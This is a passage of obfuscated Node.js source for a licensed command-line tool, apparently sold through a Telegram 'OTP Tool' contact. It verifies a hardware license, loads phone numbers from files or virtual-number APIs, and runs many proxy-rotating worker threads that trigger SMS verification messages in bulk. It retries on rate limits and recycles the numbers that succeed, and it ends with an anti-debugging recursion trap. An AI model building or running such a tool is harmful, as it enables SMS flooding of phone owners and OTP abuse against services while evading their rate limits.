              console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — VIEWPOINT    ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v400.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v447.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
            }
          }
          const v445 = v400 + "|viewpoint|2.0.2|" + v404;
          !verifyServerSignature(v445, v434.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
          v402 = true;
          let v446 = v434.token;
          !v446 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
            !v446 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
            const v449 = {};
            v449.hwid = v400, v449.app_id = "viewpoint", v449.token = v446;
            const v450 = JSON.stringify(v449);
            const v451 = {
                'hostname': v432,
                'port': 0xec1,
                'path': "/api/ping",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v450)
                },
                'timeout': 0x1388
              },
              v452 = v433.request(v451, v453 => {
                {
                  let v454 = '';
                  v453.on("data", v455 => v454 += v455), v453.on("end", () => {
                    try {
                      {
                        const v456 = JSON.parse(v454);
                        if (v456.status === 'ok' && v456.token) {
                          v446 = v456.token;
                        } else console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1);
                      }
                    } catch (v457) {
                      console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                    }
                  });
                }
              });
            v452.on("error", () => {
              console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
              process.exit(1);
            }), v452.on("timeout", function () {
              this.destroy(), console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
              process.exit(1);
            }), v452.write(v450), v452.end();
          }, 45000);
        }
      }
    } catch (v458) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    !v402 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    const v405 = process.argv.slice(2).filter(v459 => !v459.startsWith('--'));
    let v406 = v405;
    v406.length === 0 && (v406 = await interactiveWizard());
    v406 = v406.map(v460 => {
      {
        if (typeof v460 === "string") {
          {
            if (v460.startsWith('\x22') && v460.endsWith('\x22')) return v460.slice(1, -1);
            if (v460.startsWith('\x27') && v460.endsWith('\x27')) return v460.slice(1, -1);
          }
        }
        return v460;
      }
    });
    let v407 = path.resolve(v406[0] || "numbers.txt"),
      v408 = parseInt(v406[1]) || 20,
      v409 = v406[2] !== undefined ? v406[2] : "proxies.txt";
    if (v409.toLowerCase() === "none" || v409 === "false") v409 = '';
    if (v409 && !v409.includes(':') && !path.isAbsolute(v409)) {
      v409 = path.resolve(v409);
    }
    printHeader(), console.log(B("  ✓ License: " + v403) + G(" | HWID: " + v400));
    let v410 = typeof v406[3] === "object" ? v406[3] : null,
      v411 = typeof v406[4] === "object" ? v406[4] : null,
      v412 = typeof v406[5] === "object" ? v406[5] : null,
      v413 = typeof v406[6] === "object" ? v406[6] : null,
      v414 = [];
    if (!v410 && !v411 && !v412 && !v413) {
      if (!fs.existsSync(v407)) {
        console.error(R("✗ Error: Numbers file not found: " + v407)), process.exit(1);
      }
      v414 = fs.readFileSync(v407, "utf8").split(/\r?\n/).map(v461 => v461.trim()).filter(v462 => v462 && v462.replace(/\D/g, '').length >= 7), v414.length === 0 && (console.error(R("✗ No valid phone numbers found in file")), process.exit(1));
    }
    let v415 = [];
    if (fs.existsSync(v409)) v415 = fs.readFileSync(v409, "utf8").split('\x0a').map(v463 => v463.trim()).filter(v464 => v464.length > 0 && !v464.startsWith('#'));else v409 && v409 !== "proxies.txt" && v409 !== '' && (v415 = [v409.trim()]);
    let v416 = [];
    if (v415.length > 0) {
      for (const v465 of v415) {
        {
          const v466 = parseProxy(v465);
          if (!v466) {
            {
              {
                console.error(R("\n  ✗ Invalid proxy format detected: \"" + v465 + '\x22'));
                console.error(R("  Please use one of the supported formats:"));
                console.error(R("    - host:port"));
                console.error(R("    - user:pass@host:port"));
                console.error(R("    - host:port:user:pass"));
                console.error(R("    - user:pass:host:port\n"));
                process.exit(1);
              }
            }
          }
          v416.push(v466);
        }
      }
      console.log(Y("\n[*] Loaded " + v416.length + " proxies ")), v416 = v416, console.log(G("✓ Found " + v416.length + " healthy proxies.\n"));
      if (v416.length === 0) {
        const v467 = {};
        v467.input = process.stdin, v467.output = process.stdout;
        const v468 = require("readline").createInterface(v467),
          v469 = await new Promise(v470 => v468.question(R("\n✗ All proxies failed health check. Do you want to run with direct connection? (y/n): "), v470));
        v468.close(), v469.toLowerCase().trim() === 'y' ? (console.log(G("  Proceeding with direct connection...")), v416 = []) : (console.error(R("  Aborting.")), process.exit(1));
      }
    }
    const v417 = v410 || v411 || v412 || v413;
    if (v417) {
      const v471 = v410 ? "NexaOTP" : v411 ? v411.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v412 ? "📱 SMS Bower" : "⚡ Zenex";
      console.log(C("✓ Target  : " + v471 + " API (" + v417.totalCount + " numbers)"));
    } else console.log(Y("✓ Loaded " + v414.length + " phone numbers"));
    if (v416.length === 0) console.log(G("  No proxies configured (running direct)"));
    console.log(C("✓ Threads: " + v408 + '\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, '');
    fs.writeFileSync(DEBUG_FILE, "=== DEBUG SESSION " + new Date().toISOString() + " ===\n");
    const v418 = new Dashboard(v417 ? v417.totalCount : v414.length),
      v419 = !!(v410 || v411 || v412 || v413);
    let v420 = false,
      v421 = false;
    const fn10 = () => {
      {
        if (v419 || v420) {
          if (v420) v421 = true;
          return;
        }
        v420 = true, fs.writeFile(v407, v414.join('\x0a'), "utf8", v472 => {
          v420 = false, v421 && (v421 = false, fn10());
        });
      }
    };
    let v422 = [],
      v423 = [],
      v424 = 0,
      v425 = false;
    if (v410 || v411) (async () => {
      try {
        for (let v473 = 0; v473 < v417.totalCount; v473++) {
          try {
            const v474 = v417.ranges[Math.floor(Math.random() * v417.ranges.length)];
            let v475;
            v410 ? v475 = await nexaLimiter.enqueue(() => nexaFetchNumber(v410.apiKey, v474, v410.serverEndpoint)) : v475 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v411.apiKey, v474, v411.getPath));
            if (v475) {
              v424++, v423.length > 0 ? v423.shift()(v475) : v422.push(v475);
            }
          } catch (v476) {
            {
              if (v476.message.includes("Insufficient balance")) break;
              if (v476.message.includes("No numbers available")) continue;
            }
          }
        }
      } finally {
        {
          v425 = true;
          while (v423.length > 0) v423.shift()(null);
        }
      }
    })();else {
      if (v412) {
        {
          const v477 = v412;
          (async () => {
            let v478 = 0;
            try {
              for (let v479 = 0; v479 < v477.totalCount; v479++) {
                try {
                  const {
                    activationId: v480,
                    phoneNumber: v481
                  } = await smsBowerFetchNumber(v477.apiKey, v477.service, v477.country, v477.maxPrice);
                  v424++, v478 = 0;
                  if (v423.length > 0) v423.shift()(v481);else v422.push(v481);
                } catch (v482) {
                  v478++;
                  if (v478 >= 5 && v424 === 0) break;
                  await new Promise(v483 => setTimeout(v483, 2000));
                }
              }
            } finally {
              {
                v425 = true;
                while (v423.length > 0) v423.shift()(null);
              }
            }
          })();
        }
      } else {
        if (v413) {
          {
            const v484 = v413;
            (async () => {
              {
                let v485 = 0;
                try {
                  for (let v486 = 0; v486 < v484.totalCount; v486++) {
                    try {
                      const v487 = v484.ranges[Math.floor(Math.random() * v484.ranges.length)],
                        v488 = await zenexFetchNumber(v484.apiKey, v487);
                      v424++, v485 = 0;
                      if (v423.length > 0) v423.shift()(v488);else v422.push(v488);
                    } catch (v489) {
                      v485++;
                      if (v485 >= 5 && v424 === 0) break;
                      await new Promise(v490 => setTimeout(v490, 2000));
                    }
                  }
                } finally {
                  v425 = true;
                  while (v423.length > 0) v423.shift()(null);
                }
              }
            })();
          }
        }
      }
    }
    const v426 = v419 ? () => {
      if (v422.length > 0) return Promise.resolve(v422.shift());
      if (v425) return Promise.resolve(null);
      return new Promise(v491 => v423.push(v491));
    } : () => {
      if (v414.length === 0) return Promise.resolve(null);
      const v492 = v414.splice(Math.floor(Math.random() * v414.length), 1)[0];
      v421 = true;
      return fn10(), Promise.resolve(v492);
    };
    const fn11 = () => {
        {
          if (v416.length === 0) return null;
          const v493 = v416[Math.floor(Math.random() * v416.length)],
            v494 = {
              ...v493
            };
          return rotateSessionId(v494);
        }
      },
      v427 = {},
      v428 = [],
      v429 = setInterval(() => v418.render(), 500);
    async function fn12(v495) {
      while (true) {
        {
          const v496 = await v426();
          if (!v496) break;
          try {
            {
              const v497 = await triggerSms(v496, {
                'onStatus': v498 => v418.setStatus("Worker " + v495 + ':\x20' + v498),
                'proxy': fn11()
              });
              if (v497.success) {
                v418.successful++, v418.processed++, fs.appendFileSync(SUCCESSFUL_FILE, v497.phone + "|Success\n"), v418.addLog("SMS triggered for " + v497.phone, "success");
              } else {
                {
                  const v499 = v497.message.includes("Proxy") || v497.message.includes("socket") || v497.message.includes("timeout") || v497.message.includes("ECONNRESET") || v497.message.includes("Too Many Requests");
                  if (v499) {
                    {
                      v427[v497.phone] = (v427[v497.phone] || 0) + 1;
                      if (v427[v497.phone] < 3) {
                        {
                          if (!v410 && !v411) v414.push(v497.phone);
                          v418.addLog("Proxy rate-limited/dropped on " + v497.phone, "retry"), await new Promise(v500 => setTimeout(v500, 5000));
                        }
                      } else v418.failed++, v418.processed++, fs.appendFileSync(FAILED_FILE, v497.phone + "|Max proxy retries reached\n"), v418.addLog("Failed on " + v497.phone + ": Too many proxy failures", "error");
                    }
                  } else v418.failed++, v418.processed++, fs.appendFileSync(FAILED_FILE, v497.phone + '|' + v497.message + '\x0a'), v418.addLog("Failed on " + v497.phone + ':\x20' + v497.message.replace("Failed: ", ''), "error");
                }
              }
            }
          } catch (v501) {
            v427[v496] = (v427[v496] || 0) + 1;
            if (v427[v496] < 3) {
              if (!v410 && !v411) v414.push(v496);
              v418.addLog("Proxy error on " + v496, "retry"), await new Promise(v502 => setTimeout(v502, 5000));
            } else {
              v418.failed++, v418.processed++, fs.appendFileSync(FAILED_FILE, v496 + "|Proxy error\n"), v418.addLog("Failed on " + v496 + ": Proxy Drop", "error");
            }
          }
        }
      }
    }
    const v430 = v410 || v411 ? Math.min(v408, (v410 || v411).totalCount) : Math.min(v408, v414.length);
    for (let v503 = 0; v503 < v430; v503++) {
      v428.push(fn12(v503));
    }
    await Promise.all(v428), clearInterval(v429), v418.render(), v418.stop();
    const v431 = await selectOption("JOB FINISHED", [{
      'name': "Reuse successful numbers (" + SUCCESSFUL_FILE + ')',
      'value': "reuse"
    }, {
      'name': "Return to Main Menu",
      'value': "home"
    }, {
      'name': "Exit",
      'value': "exit"
    }]);
    if (v431 === "exit") process.exit(0);else {
      if (v431 === "reuse") {
        {
          if (fs.existsSync(SUCCESSFUL_FILE)) {
            {
              let v504 = fs.readFileSync(SUCCESSFUL_FILE, "utf8").split('\x0a').map(v505 => v505.split('|')[0].trim()).filter(v506 => v506.length > 5);
              return fs.writeFileSync(v407, v504.join('\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), console.log("\n  [32m✓ Copied " + v504.length + " successful numbers to " + v407 + " and cleared " + SUCCESSFUL_FILE + ".[0m\n"), process.argv = ['', '', v407, String(v408), v409], start();
            }
          } else console.log("\n  [31m✗ No successful numbers found.[0m\n"), process.exit(0);
        }
      } else return process.argv = [], start();
    }
  }
  start()["catch"](v507 => {
    console.error(R("Fatal error: " + v507.message));
    process.exit(1);
  });
}
function fn2(v508) {
  function fn13(v509) {
    {
      fn13(++v509);
    }
  }
  try {
    if (v508) {
      return fn13;
    } else fn13(0);
  } catch (v510) {}
}